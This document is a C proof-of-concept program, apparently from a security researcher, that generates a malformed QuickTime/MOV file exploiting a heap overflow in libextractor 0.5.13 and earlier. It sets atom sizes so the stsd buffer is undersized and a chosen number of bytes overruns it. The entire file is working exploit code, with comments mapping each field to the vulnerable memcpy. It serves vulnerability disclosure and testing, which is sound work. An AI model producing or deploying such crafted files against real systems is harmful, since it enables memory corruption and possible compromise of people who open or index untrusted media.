/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>



#define VER     "0.1"
#define BOFCHR  'a'
#define BOFSZ   8



#define QT_ATOM( ch0, ch1, ch2, ch3 ) \
        ( (unsigned char)(ch3) | \
        ( (unsigned char)(ch2) << 8 ) | \
        ( (unsigned char)(ch1) << 16 ) | \
        ( (unsigned char)(ch0) << 24 ) )

#define MDAT_ATOM QT_ATOM('m', 'd', 'a', 't')
#define MOOV_ATOM QT_ATOM('m', 'o', 'o', 'v')
#define TRAK_ATOM QT_ATOM('t', 'r', 'a', 'k')
#define STSD_ATOM QT_ATOM('s', 't', 's', 'd')



void fdbnum(FILE *fd, uint64_t num, int size);
void fddata(FILE *fd, const uint8_t *data, int size);
void std_err(void);



int main(int argc, char *argv[]) {
    FILE    *fd;
    int     tmp,
            allocsize = 12, // it means 0: allocsize - 12
            bofsize   = BOFSZ;
    uint8_t *bof;

    setbuf(stdout, NULL);

    fputs("\n"
        "libextractor <= 0.5.13 (revision 2832) QT heap overflow "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <file_to_create.QT/MOV> [bof_size(%d)]\n"
            "\n", argv[0], bofsize);
        exit(1);
    }

    if(argc > 2) bofsize = atoi(argv[2]);

    printf("- create file %s\n", argv[1]);
    fd = fopen(argv[1], "wb");
    if(!fd) std_err();

    fdbnum(fd,  8,          32);    // size includes these 4 bytes
    fdbnum(fd,  MDAT_ATOM,  32);    // useless, we can skip both

                                    // find_moov_atom
    tmp = 8 + 8 + 8 + 12 + 4 + bofsize;
    fdbnum(fd,  tmp,        32);    // atom_preamble[0] = atom_size
    fdbnum(fd,  MOOV_ATOM,  32);    // atom_preamble[4] = atom

    tmp -= 8;
    fdbnum(fd,  tmp,        32);    // trak_atom_size
    fdbnum(fd,  TRAK_ATOM,  32);    // trak_atom

                                    // allocsize is the size used to allocate
                                    // the trak->stsd buffer, the "correct"
                                    // value should be allocsize + bofsize
    fdbnum(fd,  allocsize,  32);    // current_atom_size (alloc to 0)
    fdbnum(fd,  STSD_ATOM,  32);    // current_atom

    fdbnum(fd,  0,          32);    // unused
    fdbnum(fd,  0,          32);    // if (BE_32(&trak_atom[i + 8]) == 1) {
    fdbnum(fd,  4,          32);    // hack_adjust, it's the offset used below

    fdbnum(fd,  bofsize,    32);    // BE_32(&trak_atom[i + 0x0C + hack_adjust])
                                    // the size of the data we want to copy
    /*
        memcpy(trak->stsd + 12, &trak_atom[i + 0x0C + hack_adjust],
          BE_32(&trak_atom[i + 0x0C + hack_adjust]));
    */

    printf("- add a buffer of %d bytes\n", bofsize);
    bof = malloc(bofsize);
    if(!bof) std_err();
    memset(bof, BOFCHR, bofsize);
    fddata(fd,  bof,        bofsize);
    free(bof);

    fclose(fd);
    printf("- finished\n");
    return(0);
}



void fdbnum(FILE *fd, uint64_t num, int size) {
    int     i,
            j;
    uint8_t tmp[sizeof(uint64_t)];

    size >>= 3;
    for(i = 0, j = size - 1; i < size; i++, j--) {
        tmp[j] = (num >> (i << 3)) & 0xff;
    }
    fwrite(tmp, size, 1, fd);
}



void fddata(FILE *fd, const uint8_t *data, int size) {
    fwrite(data, size, 1, fd);
}



void std_err(void) {
    perror("\nError");
    exit(1);
}

